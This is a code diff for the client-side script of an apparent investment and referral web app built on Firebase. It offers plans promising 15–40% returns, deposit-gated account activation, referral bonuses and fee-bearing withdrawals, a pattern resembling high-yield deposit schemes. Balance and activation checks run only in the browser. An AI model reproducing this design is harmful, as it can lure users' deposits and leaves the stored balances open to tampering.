+                // Default offers
+                const offers = [
+                    {
+                        title: "Referral Bonus",
+                        description: "Make 20 referrals in 2 days and get $2.1 bonus!",
+                        reward: 2.1
+                    },
+                    {
+                        title: "First Investment",
+                        description: "Make your first investment and get 5% extra returns!",
+                        reward: "5% extra"
+                    }
+                ];
+                
+                const container = document.getElementById('offers-list');
+                container.innerHTML = '';
+                
+                offers.forEach(offer => {
+                    const offerEl = document.createElement('div');
+                    offerEl.className = 'offer-card';
+                    offerEl.innerHTML = `
+                        <h4>${offer.title}</h4>
+                        <p>${offer.description}</p>
+                        <p style="color: #6ab8ff; margin-top: 10px;">Reward: ${offer.reward}</p>
+                    `;
+                    container.appendChild(offerEl);
+                });
+            } catch (error) {
+                console.error("Error loading offers:", error);
+            }
+        }
+        
+        // Update UI with user data
+        function updateUI() {
+            if (!userData) return;
+            
+            document.getElementById('username').textContent = userData.name || 'User';
+            document.getElementById('user-email').textContent = userData.email || '';
+            document.getElementById('accbal').textContent = (userData.balance || 0).toFixed(2);
+            document.getElementById('account-status').textContent = userData.isActive ? 'Active' : 'Inactive';
+            document.getElementById('user-referral').textContent = userData.referralCode || 'N/A';
+            document.getElementById('total-referrals').textContent = userData.referrals || 0;
+            document.getElementById('join-date').textContent = userData.createdAt ? new Date(userData.createdAt).toLocaleDateString() : 'N/A';
+            
+            // Calculate earnings
+            let totalEarnings = 0;
+            let weekEarnings = 0;
+            let todayEarnings = 0;
+            
+            const today = new Date().toDateString();
+            const weekAgo = new Date();
+            weekAgo.setDate(weekAgo.getDate() - 7);
+            
+            allTransactions.forEach(txn => {
+                if (txn.type === 'earning') {
+                    totalEarnings += txn.amount;
+                    
+                    const txnDate = new Date(txn.date);
+                    if (txnDate >= weekAgo) {
+                        weekEarnings += txn.amount;
+                    }
+                    
+                    if (txnDate.toDateString() === today) {
+                        todayEarnings += txn.amount;
+                    }
+                }
+            });
+            
+            document.getElementById('total-earnings').textContent = totalEarnings.toFixed(2);
+            document.getElementById('week-earnings').textContent = weekEarnings.toFixed(2);
+            document.getElementById('today-earnings').textContent = todayEarnings.toFixed(2);
+            
+            // Update referral link
+            if (userData.referralCode) {
+                document.getElementById('referral-link').textContent = 
+                    `${window.location.origin}?ref=${userData.referralCode}`;
+            }
+            
+            // Check activation
+            if (!userData.isActive) {
+                showNotification("Please activate your account by making a deposit.");
+            }
+        }
+        
+        // Show notification
+        function showNotification(message) {
+            const container = document.getElementById('notifications');
+            const notification = document.createElement('div');
+            notification.className = 'notification';
+            notification.innerHTML = `
+                <i class="fas fa-info-circle"></i> ${message}
+            `;
+            container.appendChild(notification);
+            
+            setTimeout(() => {
+                notification.remove();
+            }, 5000);
+        }
+        
+        // Show page
+        function showPage(pageId) {
+            // Hide all pages
+            document.querySelectorAll('.page').forEach(page => {
+                page.classList.remove('active');
+            });
+            
+            // Show selected page
+            const page = document.getElementById(pageId);
+            if (page) {
+                page.classList.add('active');
+            }
+            
+            // Close nav menu
+            closeNav();
+        }
+        
+        // Open navigation
+        function openNav() {
+            document.getElementById('nav-menu').classList.add('open');
+        }
+        
+        // Close navigation
+        function closeNav() {
+            document.getElementById('nav-menu').classList.remove('open');
+        }
+        
+        // Show modal
+        function showModal(modalId) {
+            document.getElementById(modalId).style.display = 'flex';
+        }
+        
+        // Close modal
+        function closeModal(modalId) {
+            document.getElementById(modalId).style.display = 'none';
+        }
+        
+        // Show login modal
+        function showLoginModal() {
+            showModal('login-modal');
+        }
+        
+        // Show deposit modal
+        function showDepositModal() {
+            showModal('deposit-modal');
+        }
+        
+        // Show withdraw modal
+        function showWithdrawModal() {
+            if (!userData || !userData.isActive) {
+                alert("Please activate your account first by making a deposit.");
+                return;
+            }
+            showModal('withdraw-modal');
+        }
+        
+        // Show referral modal
+        function showReferralModal() {
+            if (!currentUser) {
+                showLoginModal();
+                return;
+            }
+            showModal('referral-modal');
+        }
+        
+        // Show tab
+        function showTab(tabId) {
+            // Update tab buttons
+            document.querySelectorAll('.tab-btn').forEach(btn => {
+                btn.classList.remove('active');
+            });
+            event.target.classList.add('active');
+            
+            // Update tab content
+            document.querySelectorAll('.tab-content').forEach(content => {
+                content.classList.remove('active');
+            });
+            document.getElementById(`${tabId}-tab`).classList.add('active');
+        }
+        
+        // Login function
+        async function login() {
+            const email = document.getElementById('login-email').value;
+            const password = document.getElementById('login-password').value;
+            const errorDiv = document.getElementById('login-error');
+            
+            if (!email || !password) {
+                errorDiv.textContent = 'Please enter email and password';
+                errorDiv.style.display = 'block';
+                return;
+            }
+            
+            try {
+                const userCredential = await auth.signInWithEmailAndPassword(email, password);
+                closeModal('login-modal');
+                location.reload();
+            } catch (error) {
+                errorDiv.textContent = error.message;
+                errorDiv.style.display = 'block';
+            }
+        }
+        
+        // Register function
+        async function register() {
+            const name = document.getElementById('register-name').value;
+            const email = document.getElementById('register-email').value;
+            const phone = document.getElementById('register-phone').value;
+            const password = document.getElementById('register-password').value;
+            const referral = document.getElementById('register-referral').value;
+            const errorDiv = document.getElementById('register-error');
+            const successDiv = document.getElementById('register-success');
+            
+            if (!name || !email || !phone || !password) {
+                errorDiv.textContent = 'Please fill all required fields';
+                errorDiv.style.display = 'block';
+                return;
+            }
+            
+            if (password.length < 6) {
+                errorDiv.textContent = 'Password must be at least 6 characters';
+                errorDiv.style.display = 'block';
+                return;
+            }
+            
+            try {
+                // Create user
+                const userCredential = await auth.createUserWithEmailAndPassword(email, password);
+                const user = userCredential.user;
+                
+                // Generate referral code
+                const referralCode = generateReferralCode(name);
+                
+                // Create user document
+                await db.collection('users').doc(user.uid).set({
+                    name: name,
+                    email: email,
+                    phone: phone,
+                    referralCode: referralCode,
+                    referredBy: referral || null,
+                    balance: 0,
+                    isActive: false,
+                    referrals: 0,
+                    totalEarnings: 0,
+                    createdAt: new Date().toISOString(),
+                    lastLogin: new Date().toISOString()
+                });
+                
+                // If referral was used, update referrer
+                if (referral) {
+                    await updateReferrer(referral);
+                }
+                
+                successDiv.textContent = 'Account created successfully! Logging in...';
+                successDiv.style.display = 'block';
+                errorDiv.style.display = 'none';
+                
+                setTimeout(() => {
+                    closeModal('login-modal');
+                    location.reload();
+                }, 2000);
+                
+            } catch (error) {
+                errorDiv.textContent = error.message;
+                errorDiv.style.display = 'block';
+                successDiv.style.display = 'none';
+            }
+        }
+        
+        // Generate referral code
+        function generateReferralCode(name) {
+            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+            let code = name.substring(0, 3).toUpperCase();
+            for (let i = 0; i < 5; i++) {
+                code += chars.charAt(Math.floor(Math.random() * chars.length));
+            }
+            return code;
+        }
+        
+        // Update referrer
+        async function updateReferrer(referralCode) {
+            try {
+                const snapshot = await db.collection('users')
+                    .where('referralCode', '==', referralCode)
+                    .get();
+                
+                if (!snapshot.empty) {
+                    const referrerDoc = snapshot.docs[0];
+                    await db.collection('users').doc(referrerDoc.id).update({
+                        referrals: firebase.firestore.FieldValue.increment(1)
+                    });
+                }
+            } catch (error) {
+                console.error("Error updating referrer:", error);
+            }
+        }
+        
+        // Submit withdrawal
+        async function submitWithdrawal() {
+            const amount = parseFloat(document.getElementById('withdraw-amount').value);
+            const method = document.getElementById('withdraw-method').value;
+            const wallet = document.getElementById('withdraw-wallet').value;
+            
+            if (!amount || amount < 10) {
+                alert("Minimum withdrawal amount is $10");
+                return;
+            }
+            
+            if (!wallet) {
+                alert("Please enter your wallet address or email");
+                return;
+            }
+            
+            if (!userData.balance || amount > userData.balance) {
+                alert("Insufficient balance");
+                return;
+            }
+            
+            try {
+                const fee = amount * 0.05; // 5% fee
+                const netAmount = amount - fee;
+                
+                // Create withdrawal request
+                await db.collection('transactions').add({
+                    userId: currentUser.uid,
+                    type: 'withdrawal',
+                    amount: amount,
+                    netAmount: netAmount,
+                    fee: fee,
+                    method: method,
+                    wallet: wallet,
+                    status: 'pending',
+                    date: new Date().toISOString(),
+                    description: `Withdrawal request via ${method}`
+                });
+                
+                alert("Withdrawal request submitted! It will be processed within 24-48 hours.");
+                closeModal('withdraw-modal');
+                loadTransactions();
+                
+            } catch (error) {
+                console.error("Error submitting withdrawal:", error);
+                alert("Error submitting withdrawal. Please try again.");
+            }
+        }
+        
+        // Invest function
+        function invest(plan) {
+            currentPlan = plan;
+            let minAmount = 50;
+            let returns = "15%";
+            let planName = "Starter Plan";
+            
+            switch(plan) {
+                case 'premium':
+                    minAmount = 200;
+                    returns = "25%";
+                    planName = "Premium Plan";
+                    break;
+                case 'vip':
+                    minAmount = 500;
+                    returns = "40%";
+                    planName = "VIP Plan";
+                    break;
+            }
+            
+            document.getElementById('invest-plan-title').textContent = planName;
+            document.getElementById('plan-name').textContent = planName;
+            document.getElementById('plan-returns').textContent = returns;
+            document.getElementById('plan-min').textContent = minAmount;
+            document.getElementById('invest-amount').min = minAmount;
+            document.getElementById('invest-amount').value = minAmount;
+            
+            showModal('invest-modal');
+        }
+        
+        // Submit investment
+        async function submitInvestment() {
+            const amount = parseFloat(document.getElementById('invest-amount').value);
+            const method = document.getElementById('invest-method').value;
+            
+            if (!amount || amount < 50) {
+                alert("Minimum investment amount is $50");
+                return;
+            }
+            
+            if (!userData.isActive) {
+                alert("Please activate your account first by making a deposit.");
+                return;
+            }
+            
+            try {
+                // Create investment
+                await db.collection('transactions').add({
+                    userId: currentUser.uid,
+                    type: 'investment',
+                    amount: amount,
+                    plan: currentPlan,
+                    method: method,
+                    status: 'pending',
+                    date: new Date().toISOString(),
+                    description: `${currentPlan} investment via ${method}`
+                });
+                
+                alert("Investment request submitted! Admin will review and approve.");
+                closeModal('invest-modal');
+                loadTransactions();
+                
+            } catch (error) {
+                console.error("Error submitting investment:", error);
+                alert("Error submitting investment. Please try again.");
+            }
+        }
+        
+        // Copy referral link
+        function copyReferralLink() {
+            const link = document.getElementById('referral-link').textContent;
+            navigator.clipboard.writeText(link).then(() => {
+                alert("Referral link copied to clipboard!");
+            });
+        }
+        
+        // Logout
+        function logout() {
+            if (confirm("Are you sure you want to logout?")) {
+                auth.signOut().then(() => {
+                    location.reload();
+                });
+            }
+        }
+    </script>
+</body>
+</html>
